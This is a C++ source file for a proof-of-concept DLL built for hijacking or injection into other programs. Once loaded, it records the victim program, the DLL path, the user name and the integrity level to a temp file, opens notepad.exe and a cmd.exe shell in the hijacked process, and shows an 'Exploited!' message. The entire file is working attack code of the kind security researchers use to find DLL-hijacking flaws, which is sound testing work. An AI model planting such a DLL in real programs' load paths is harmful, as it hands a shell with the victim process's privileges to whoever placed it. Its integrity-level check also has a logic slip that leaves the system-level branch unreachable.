

// dllmain.cpp : Defines the entry point for the DLL application.
// Test DLL for injection v1.0


#define WIN32_DEFAULT_LIBS

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comdlg32.lib")



#include "stdafx.h"
#include "windows.h"
#include "iostream"

#include <fstream>
#include <cstdio>
#include <Lmcons.h>
#include <string>
#include <stdio.h>
#include <time.h>

#include <ShellApi.h>

LPWSTR GetProcessIntegrityLevel();

LPWSTR GetProcessIntegrityLevel()
{
	HANDLE hToken;
	HANDLE hProcess;

	DWORD dwLengthNeeded;
	DWORD dwError = ERROR_SUCCESS;

	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	DWORD dwIntegrityLevel;

	LPWSTR retVal;
	retVal = L"Error retreiving Integrity Level";

	hProcess = GetCurrentProcess();
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		// Get the Integrity level.
		if (!GetTokenInformation(hToken, TokenIntegrityLevel,
			NULL, 0, &dwLengthNeeded))
		{
			dwError = GetLastError();
			if (dwError == ERROR_INSUFFICIENT_BUFFER)
			{
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
					dwLengthNeeded);
				if (pTIL != NULL)
				{
					if (GetTokenInformation(hToken, TokenIntegrityLevel,
						pTIL, dwLengthNeeded, &dwLengthNeeded))
					{
						dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
							(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

						if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
						{
							// Low Integrity
							retVal = (L"Low Process");
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
							dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
						{
							// Medium Integrity
							retVal = (L"Medium Process");
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
						{
							// High Integrity
							retVal = (L"High Integrity Process");
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
						{
							// System Integrity
							retVal = (L"System Integrity Process");
						}
					}
					LocalFree(pTIL);
				}
			}
		}
		CloseHandle(hToken);
		return retVal;
	}
}

const std::wstring currentDateTime()
{
	time_t     now = time(0);
	struct tm  tstruct;
	wchar_t       buf[80];
	tstruct = *localtime(&now);
	wcsftime(buf, sizeof(buf), L"%Y-%m-%d.%X", &tstruct);

	return buf;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{

		using namespace std;

		PROCESS_INFORMATION ProcessInfo;
		STARTUPINFO StartupInfo;

		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
		StartupInfo.cb = sizeof StartupInfo;

		TCHAR szTempPathBuffer[MAX_PATH];
		TCHAR szExeFileName[MAX_PATH];
		TCHAR szDLLFileName[MAX_PATH];
		TCHAR temp_file[MAX_PATH + 9];
		TCHAR username[UNLEN + 1];
		DWORD sizeUN = UNLEN + 1;

		LPWSTR szProcessIntegrity;


		GetModuleFileName(hModule, szDLLFileName, MAX_PATH);


		GetUserName((TCHAR*)username, &sizeUN);
		GetModuleFileName(NULL, szExeFileName, MAX_PATH);
		GetTempPath(MAX_PATH, szTempPathBuffer);
		lstrcpy(temp_file, szTempPathBuffer);
		lstrcat(temp_file, TEXT("DLLHooks.txt"));
		szProcessIntegrity = GetProcessIntegrityLevel();

		wofstream outfile;


		outfile.open(temp_file, wofstream::app);
		outfile << L"==================================================" << std::endl;
		outfile << currentDateTime() << std::endl;
		outfile << L"Victim Application: " << szExeFileName << std::endl;
		outfile << L"Hijacked DLL: " << szDLLFileName << std::endl;
		outfile << L"Process User Name: " << username << std::endl;
		outfile << L"Process Integrity Level: " << szProcessIntegrity << std::endl;
		outfile << L"==================================================" << std::endl << std::endl;
		outfile.close();

		//cout << msgbox;


		CreateProcess(L"c:\\windows\\system32\\notepad.exe", NULL,
			NULL, NULL, FALSE, 0, NULL,
			NULL, &StartupInfo, &ProcessInfo);

		CreateProcess(L"c:\\windows\\system32\\cmd.exe", NULL,
			NULL, NULL, FALSE, 0, NULL,
			NULL, &StartupInfo, &ProcessInfo);

		MessageBoxW(NULL, L"Exploited!", L"@Laughing_Mantis", MB_OK | MB_ICONEXCLAMATION);

		//ShellExecute(NULL, L"open", L"C:\\windows\\system32\\calc.exe", NULL, NULL, SW_SHOWNORMAL);

		//sprintf(msgbox, "Exploited Binary: %s - Running @ %s - Intgrity Level @ %s", szExeFileName, username, szProcessIntegrity);


		//FreeLibraryAndExitThread(hModule, 0);
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	{
		break;
	}
	}
	return TRUE;
}



